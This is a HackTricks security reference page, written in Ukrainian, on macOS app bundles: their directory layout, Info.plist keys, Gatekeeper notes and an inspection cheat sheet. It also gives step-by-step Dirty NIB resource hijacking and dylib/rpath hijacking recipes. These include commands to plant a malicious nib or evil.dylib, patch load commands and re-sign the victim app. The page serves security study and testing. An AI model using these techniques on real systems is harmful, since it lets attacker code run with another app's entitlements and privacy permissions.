# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Bundles у macOS слугують контейнерами для різноманітних ресурсів, зокрема applications, libraries та інших необхідних файлів, завдяки чому у Finder вони виглядають як єдині об’єкти, наприклад знайомі файли `*.app`. Найпоширенішим bundle є `.app` bundle, хоча також часто використовуються інші типи, як-от `.framework`, `.systemextension` і `.kext`.

### Основні компоненти bundle

Усередині bundle, зокрема в каталозі `<application>.app/Contents/`, містяться різноманітні важливі ресурси:

- **\_CodeSignature**: Цей каталог зберігає відомості про code-signing, необхідні для перевірки цілісності application. Переглянути інформацію про code-signing можна за допомогою таких команд:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Містить виконуваний binary застосунку, який запускається після взаємодії з користувачем.
- **Resources**: Сховище компонентів інтерфейсу користувача застосунку, зокрема зображень, документів і описів інтерфейсу (файлів nib/xib).
- **Info.plist**: Виконує роль основного конфігураційного файлу застосунку, необхідного для коректного розпізнавання та взаємодії системи із застосунком.

#### Важливі ключі в Info.plist

Файл `Info.plist` є основою конфігурації застосунку та містить такі ключі:

- **CFBundleExecutable**: Визначає назву основного executable-файлу, розташованого в каталозі `Contents/MacOS`.
- **CFBundleIdentifier**: Надає застосунку глобальний ідентифікатор, який macOS активно використовує для керування застосунками.
- **LSMinimumSystemVersion**: Вказує мінімальну версію macOS, необхідну для запуску застосунку.

### Дослідження Bundles

Для дослідження вмісту bundle, наприклад `Safari.app`, можна використати таку команду: `bash ls -lR /Applications/Safari.app/Contents`

Це дослідження показує такі каталоги, як `_CodeSignature`, `MacOS`, `Resources`, і такі файли, як `Info.plist`. Кожен із них має окреме призначення: від захисту застосунку до визначення його інтерфейсу користувача та операційних параметрів.

#### Додаткові каталоги Bundle

Окрім стандартних каталогів, bundles також можуть містити:

- **Frameworks**: Містить bundled frameworks, які використовує застосунок. Frameworks подібні до dylibs, але містять додаткові ресурси.
- **PlugIns**: Каталог для plug-ins і extensions, які розширюють можливості застосунку.
- **XPCServices**: Містить XPC services, які застосунок використовує для міжпроцесної комунікації.

Ця структура забезпечує інкапсуляцію всіх необхідних компонентів у bundle, створюючи модульне та безпечне середовище застосунку.

Докладнішу інформацію про ключі `Info.plist` та їхні значення можна знайти в документації Apple для developer-ів: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Нотатки щодо безпеки та вектори зловживання

- **Gatekeeper / App Translocation**: Коли quarantined bundle запускається вперше, macOS виконує глибоку перевірку signature і може запустити його з рандомізованого translocated path. Після прийняття під час наступних запусків виконуються лише поверхневі перевірки; resource files у `Resources/`, `PlugIns/`, nibs тощо історично не перевірялися. Починаючи з macOS 13 Ventura, під час першого запуску виконується deep check, а новий дозвіл TCC *App Management* обмежує сторонні процеси в модифікації інших bundles без згоди користувача, однак старі системи залишаються вразливими.
- **Колізії Bundle Identifier**: Кілька embedded targets (PlugIns, helper tools), які повторно використовують той самий `CFBundleIdentifier`, можуть порушити перевірку signature та іноді сприяти hijacking/confusion URL-схем. Завжди перелічуйте sub-bundles і перевіряйте унікальність ID.

## Resource Hijacking (Dirty NIB / NIB Injection)

До Ventura заміна UI resources у signed app могла обійти поверхневу перевірку code signing і забезпечити code execution із entitlements застосунку. Поточні дослідження (2024) показують, що це й надалі працює на системах до Ventura та в un-quarantined builds:<sup>[[1]](#references)[[2]](#references)</sup>

1. Скопіюйте target app у location, доступне для запису (наприклад, `/tmp/Victim.app`).
2. Замініть `Contents/Resources/MainMenu.nib` (або будь-який nib, оголошений у `NSMainNibFile`) на malicious nib, який створює екземпляр `NSAppleScript`, `NSTask` тощо.
3. Запустіть застосунок. Malicious nib виконується в межах bundle ID та entitlements victim (TCC grants, microphone/camera тощо).
4. Ventura+ пом’якшує проблему, виконуючи deep verification bundle під час першого запуску та вимагаючи дозвіл *App Management* для подальших модифікацій, тому persistence стає складнішим, але initial-launch attacks у старих версіях macOS усе ще актуальні.<sup>[[1]](#references)</sup>

Приклад мінімального malicious nib payload (скомпілюйте xib у nib за допомогою `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

Оскільки пошук `@rpath` надає перевагу вбудованим Frameworks/PlugIns, розміщення malicious library всередині `Contents/Frameworks/` або `Contents/PlugIns/` може перенаправити порядок завантаження, якщо основний binary підписаний без library validation або зі слабким порядком `LC_RPATH`.

Типові кроки під час використання unsigned/ad‑hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Нотатки:
- Hardened runtime за відсутності `com.apple.security.cs.disable-library-validation` блокує сторонні dylibs; спочатку перевірте entitlements.
- XPC services у `Contents/XPCServices/` часто завантажують sibling frameworks — аналогічно застосовуйте patch до їхніх binaries для persistence або privilege escalation paths.

## Коротка шпаргалка з перевірки
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Посилання

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
